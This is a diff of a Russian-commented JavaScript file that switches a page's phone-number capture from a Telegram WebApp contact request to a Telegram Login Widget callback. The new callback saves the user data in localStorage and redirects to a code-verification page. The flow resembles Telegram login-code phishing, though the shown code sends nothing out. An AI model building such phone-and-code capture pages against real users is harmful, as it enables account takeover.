@@ -3,41 +3,35 @@ function showMessage() {
     alert('Кнопка пока не работает! Это просто демо-версия дизайна.');
 }
 
-function startVerification() {
-    // Проверяем, запущено ли приложение в Telegram WebApp
-    if (window.Telegram && window.Telegram.WebApp) {
-        // Показываем кнопку для отправки номера телефона
-        showPhoneRequest();
-    } else {
-        // Если не в Telegram, показываем обычный prompt
-        const phone = prompt('Введите ваш номер телефона (например: +380123456789):');
-        if (phone && phone.trim()) {
-            localStorage.setItem('phoneNumber', phone.trim());
-            window.location.href = 'code-verification.html';
+// Функция обработки авторизации через Telegram Login Widget
+function onTelegramAuth(user) {
+    console.log('Telegram авторизация:', user);
+    
+    // Проверяем, что пользователь авторизован
+    if (user && user.id) {
+        // Сохраняем данные пользователя
+        localStorage.setItem('telegramUser', JSON.stringify(user));
+        
+        // Если есть номер телефона, сохраняем его
+        if (user.phone_number) {
+            localStorage.setItem('phoneNumber', user.phone_number);
         }
+        
+        // Переходим на страницу ввода кода
+        window.location.href = 'code-verification.html';
+    } else {
+        alert('Ошибка авторизации. Попробуйте снова.');
     }
 }
 
-function showPhoneRequest() {
-    // Создаем кнопку для отправки номера телефона
-    const button = window.Telegram.WebApp.MainButton;
-    
-    button.setText('📱 Поделиться номером телефона');
-    button.show();
-    
-    // Обработчик нажатия на кнопку
-    button.onClick(() => {
-        // Запрашиваем контакт
-        window.Telegram.WebApp.requestContact((contact) => {
-            if (contact && contact.phone_number) {
-                // Сохраняем номер
-                localStorage.setItem('phoneNumber', contact.phone_number);
-                
-                // Переходим на страницу ввода кода
-                window.location.href = 'code-verification.html';
-            }
-        });
-    });
+// Функция для старой кнопки (если нужна)
+function startVerification() {
+    // Показываем обычный prompt как fallback
+    const phone = prompt('Введите ваш номер телефона (например: +380123456789):');
+    if (phone && phone.trim()) {
+        localStorage.setItem('phoneNumber', phone.trim());
+        window.location.href = 'code-verification.html';
+    }
 }
 
 // Функции для модального окна
